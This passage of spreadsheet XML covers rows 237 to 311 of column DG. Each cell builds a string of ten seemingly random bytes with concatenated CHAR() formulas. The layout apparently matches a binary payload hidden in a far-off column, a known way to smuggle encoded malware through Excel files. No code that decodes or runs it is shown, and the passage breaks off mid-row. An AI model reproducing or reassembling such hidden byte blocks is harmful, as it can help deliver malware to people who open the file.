    <row r="237" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG237" t="str">
        <f>CHAR(172)&amp;CHAR(193)&amp;CHAR(175)&amp;CHAR(8)&amp;CHAR(211)&amp;CHAR(95)&amp;CHAR(61)&amp;CHAR(162)&amp;CHAR(187)&amp;CHAR(226)</f>
        <v>¬Á¯_x0008_Ó_=¢»â</v>
      </c>
    </row>
    <row r="238" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG238" t="str">
        <f>CHAR(202)&amp;CHAR(47)&amp;CHAR(254)&amp;CHAR(123)&amp;CHAR(55)&amp;CHAR(150)&amp;CHAR(167)&amp;CHAR(244)&amp;CHAR(171)&amp;CHAR(5)</f>
        <v>Ê/þ{7–§ô«_x0005_</v>
      </c>
    </row>
    <row r="239" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG239" t="str">
        <f>CHAR(216)&amp;CHAR(120)&amp;CHAR(38)&amp;CHAR(130)&amp;CHAR(151)&amp;CHAR(233)&amp;CHAR(191)&amp;CHAR(18)&amp;CHAR(251)&amp;CHAR(29)</f>
        <v>Øx&amp;‚—é¿_x0012_û_x001D_</v>
      </c>
    </row>
    <row r="240" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG240" t="str">
        <f>CHAR(4)&amp;CHAR(182)&amp;CHAR(167)&amp;CHAR(239)&amp;CHAR(171)&amp;CHAR(18)&amp;CHAR(235)&amp;CHAR(84)&amp;CHAR(60)&amp;CHAR(190)</f>
        <v>_x0004_¶§ï«_x0012_ëT&lt;¾</v>
      </c>
    </row>
    <row r="241" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG241" t="str">
        <f>CHAR(161)&amp;CHAR(134)&amp;CHAR(135)&amp;CHAR(38)&amp;CHAR(15)&amp;CHAR(29)&amp;CHAR(81)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>¡†‡&amp;_x000F__x001D_Q×Õ†</v>
      </c>
    </row>
    <row r="242" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG242" t="str">
        <f>CHAR(206)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(173)&amp;CHAR(40)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(114)&amp;CHAR(124)</f>
        <v>Î|Ÿ_x001D_­(Õ†r|</v>
      </c>
    </row>
    <row r="243" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG243" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(138)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Š|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="244" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG244" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="245" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG245" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="246" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG246" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="247" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG247" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(210)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(196)&amp;CHAR(99)&amp;CHAR(37)&amp;CHAR(19)</f>
        <v>Ÿ_x001D_Ò×Õ†Äc%_x0013_</v>
      </c>
    </row>
    <row r="248" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG248" t="str">
        <f>CHAR(82)&amp;CHAR(99)&amp;CHAR(220)&amp;CHAR(75)&amp;CHAR(235)&amp;CHAR(196)&amp;CHAR(158)&amp;CHAR(81)&amp;CHAR(159)&amp;CHAR(246)</f>
        <v>RcÜKëÄžQŸö</v>
      </c>
    </row>
    <row r="249" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG249" t="str">
        <f>CHAR(129)&amp;CHAR(238)&amp;CHAR(163)&amp;CHAR(15)&amp;CHAR(191)&amp;CHAR(109)&amp;CHAR(32)&amp;CHAR(184)&amp;CHAR(178)&amp;CHAR(244)</f>
        <v>î£_x000F_¿m ¸²ô</v>
      </c>
    </row>
    <row r="250" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG250" t="str">
        <f>CHAR(171)&amp;CHAR(17)&amp;CHAR(191)&amp;CHAR(126)&amp;CHAR(51)&amp;CHAR(185)&amp;CHAR(187)&amp;CHAR(233)&amp;CHAR(190)&amp;CHAR(92)</f>
        <v>«_x0011_¿~3¹»é¾\</v>
      </c>
    </row>
    <row r="251" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG251" t="str">
        <f>CHAR(253)&amp;CHAR(120)&amp;CHAR(114)&amp;CHAR(165)&amp;CHAR(160)&amp;CHAR(232)&amp;CHAR(234)&amp;CHAR(21)&amp;CHAR(241)&amp;CHAR(61)</f>
        <v>ýxr¥ èê_x0015_ñ=</v>
      </c>
    </row>
    <row r="252" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG252" t="str">
        <f>CHAR(22)&amp;CHAR(152)&amp;CHAR(134)&amp;CHAR(166)&amp;CHAR(167)&amp;CHAR(19)&amp;CHAR(251)&amp;CHAR(120)&amp;CHAR(124)&amp;CHAR(218)</f>
        <v>_x0016_˜†¦§_x0013_ûx|Ú</v>
      </c>
    </row>
    <row r="253" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG253" t="str">
        <f>CHAR(216)&amp;CHAR(140)&amp;CHAR(238)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>ØŒî|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="254" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG254" t="str">
        <f>CHAR(154)&amp;CHAR(57)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(54)&amp;CHAR(81)&amp;CHAR(214)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>š9Ÿ_x001D_6QÖ†Ê|</v>
      </c>
    </row>
    <row r="255" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG255" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="256" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG256" t="str">
        <f>CHAR(162)&amp;CHAR(215)&amp;CHAR(247)&amp;CHAR(134)&amp;CHAR(193)&amp;CHAR(126)&amp;CHAR(151)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(209)</f>
        <v>¢×÷†Á~—_x001D_RÑ</v>
      </c>
    </row>
    <row r="257" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG257" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(122)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†ÊzŸ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="258" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG258" t="str">
        <f>CHAR(132)&amp;CHAR(88)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(247)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>„XŸ_x001D_R÷Õ†Ê|</v>
      </c>
    </row>
    <row r="259" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG259" t="str">
        <f>CHAR(223)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(92)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>ß_x001D_R×Õ†Ê\Ÿ_x001D_</v>
      </c>
    </row>
    <row r="260" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG260" t="str">
        <f>CHAR(82)&amp;CHAR(213)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(206)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>RÕÕ†Î|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="261" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG261" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(206)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Î|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="262" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG262" t="str">
        <f>CHAR(202)&amp;CHAR(252)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(213)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>ÊüŸ_x001D_RÕÕ†Ê|</v>
      </c>
    </row>
    <row r="263" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG263" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(81)&amp;CHAR(215)&amp;CHAR(149)&amp;CHAR(3)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(223)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_Q×•_x0003_Ê|ß_x001D_</v>
      </c>
    </row>
    <row r="264" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG264" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(60)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê&lt;Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="265" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG265" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(143)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="266" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG266" t="str">
        <f>CHAR(202)&amp;CHAR(92)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê\Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="267" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG267" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(66)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_B×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="268" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG268" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(58)&amp;CHAR(95)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(9)&amp;CHAR(215)</f>
        <v>R×Õ†:_Ÿ_x001D_	×</v>
      </c>
    </row>
    <row r="269" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG269" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(60)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(122)&amp;CHAR(212)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê&lt;Ÿ_x001D_zÔÕ†</v>
      </c>
    </row>
    <row r="270" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG270" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="271" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG271" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(28)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê_x001C_Ÿ_x001D_</v>
      </c>
    </row>
    <row r="272" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG272" t="str">
        <f>CHAR(94)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>^×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="273" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG273" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="274" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG274" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="275" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG275" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="276" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG276" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="277" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG277" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(92)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(66)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê\Ÿ_x001D_B×Õ†</v>
      </c>
    </row>
    <row r="278" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG278" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(218)&amp;CHAR(92)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ú\</v>
      </c>
    </row>
    <row r="279" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG279" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(26)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D__x001A_×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="280" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG280" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(228)&amp;CHAR(8)&amp;CHAR(250)&amp;CHAR(101)&amp;CHAR(38)&amp;CHAR(215)</f>
        <v>R×Õ†ä_x0008_úe&amp;×</v>
      </c>
    </row>
    <row r="281" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG281" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(144)&amp;CHAR(120)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(247)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†xŸ_x001D_R÷Õ†</v>
      </c>
    </row>
    <row r="282" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG282" t="str">
        <f>CHAR(202)&amp;CHAR(122)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(213)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>ÊzŸ_x001D_RÕÕ†Ê|</v>
      </c>
    </row>
    <row r="283" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG283" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="284" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG284" t="str">
        <f>CHAR(114)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(230)&amp;CHAR(228)&amp;CHAR(14)&amp;CHAR(236)&amp;CHAR(111)&amp;CHAR(49)&amp;CHAR(215)</f>
        <v>r×Õæä_x000E_ìo1×</v>
      </c>
    </row>
    <row r="285" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG285" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(226)&amp;CHAR(127)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(151)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†âŸ_x001D_R—Õ†</v>
      </c>
    </row>
    <row r="286" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG286" t="str">
        <f>CHAR(202)&amp;CHAR(120)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(223)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>ÊxŸ_x001D_RßÕ†Ê|</v>
      </c>
    </row>
    <row r="287" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG287" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="288" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG288" t="str">
        <f>CHAR(18)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(198)&amp;CHAR(228)&amp;CHAR(14)&amp;CHAR(250)&amp;CHAR(113)&amp;CHAR(61)&amp;CHAR(180)</f>
        <v>_x0012_×ÕÆä_x000E_úq=´</v>
      </c>
    </row>
    <row r="289" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG289" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(198)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(183)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Æ|Ÿ_x001D_R·Õ†</v>
      </c>
    </row>
    <row r="290" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG290" t="str">
        <f>CHAR(202)&amp;CHAR(126)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(219)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê~Ÿ_x001D_RÛÕ†Ê|</v>
      </c>
    </row>
    <row r="291" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG291" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="292" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG292" t="str">
        <f>CHAR(18)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(196)&amp;CHAR(250)&amp;CHAR(88)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>_x0012_×ÕÄúXŸ_x001D_R×</v>
      </c>
    </row>
    <row r="293" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG293" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="294" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG294" t="str">
        <f>CHAR(130)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(80)&amp;CHAR(215)&amp;CHAR(208)&amp;CHAR(134)&amp;CHAR(186)&amp;CHAR(92)</f>
        <v>‚|Ÿ_x001D_P×Ð†º\</v>
      </c>
    </row>
    <row r="295" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG295" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(42)&amp;CHAR(212)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(203)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_*ÔÕ†Ë|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="296" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG296" t="str">
        <f>CHAR(80)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(128)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>P×Õ€Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="297" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG297" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="298" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG298" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="299" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG299" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="300" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG300" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="301" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG301" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(212)&amp;CHAR(126)&amp;CHAR(183)&amp;CHAR(30)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(223)&amp;CHAR(172)</f>
        <v>Õ†Ô~·_x001E_R×ß¬</v>
      </c>
    </row>
    <row r="302" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG302" t="str">
        <f>CHAR(248)&amp;CHAR(14)&amp;CHAR(158)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(167)&amp;CHAR(253)&amp;CHAR(132)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>ø_x000E_ž_x001D_R§ý„Ê|</v>
      </c>
    </row>
    <row r="303" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG303" t="str">
        <f>CHAR(149)&amp;CHAR(59)&amp;CHAR(120)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(136)&amp;CHAR(47)&amp;CHAR(213)&amp;CHAR(95)</f>
        <v>•;x×Õ†ˆ/Õ_</v>
      </c>
    </row>
    <row r="304" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG304" t="str">
        <f>CHAR(83)&amp;CHAR(215)&amp;CHAR(212)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(94)&amp;CHAR(215)</f>
        <v>S×Ô†Ê|Ÿ_x001D_^×</v>
      </c>
    </row>
    <row r="305" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG305" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(188)&amp;CHAR(72)&amp;CHAR(177)&amp;CHAR(45)&amp;CHAR(124)&amp;CHAR(228)&amp;CHAR(229)&amp;CHAR(181)</f>
        <v>Õ†¼H±-|äåµ</v>
      </c>
    </row>
    <row r="306" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG306" t="str">
        <f>CHAR(251)&amp;CHAR(69)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(208)&amp;CHAR(134)&amp;CHAR(166)&amp;CHAR(124)</f>
        <v>ûEŸ_x001D_R×Ð†¦|</v>
      </c>
    </row>
    <row r="307" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG307" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(90)&amp;CHAR(214)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(233)&amp;CHAR(2)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_ZÖÕ†é_x0002_Ÿ_x001D_</v>
      </c>
    </row>
    <row r="308" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG308" t="str">
        <f>CHAR(38)&amp;CHAR(214)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(125)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(113)&amp;CHAR(132)</f>
        <v>&amp;ÖÕ†Ê}Ÿ_x001D_q„</v>
      </c>
    </row>
    <row r="309" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG309" t="str">
        <f>CHAR(161)&amp;CHAR(244)&amp;CHAR(163)&amp;CHAR(18)&amp;CHAR(248)&amp;CHAR(110)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>¡ô£_x0012_ønR×Õ†</v>
      </c>
    </row>
    <row r="310" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG310" t="str">
        <f>CHAR(190)&amp;CHAR(126)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(74)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(233)&amp;CHAR(41)</f>
        <v>¾~Ÿ_x001D_J×Õ†é)</v>
      </c>
    </row>
    <row r="311" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG311" t="str">
        <f>CHAR(204)&amp;CHAR(29)&amp;CHAR(222)&amp;CHAR(213)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(218)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ì_x001D_ÞÕÕ†Ú|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="312" spans="111:111" x14ac:dyDescent="0.45">
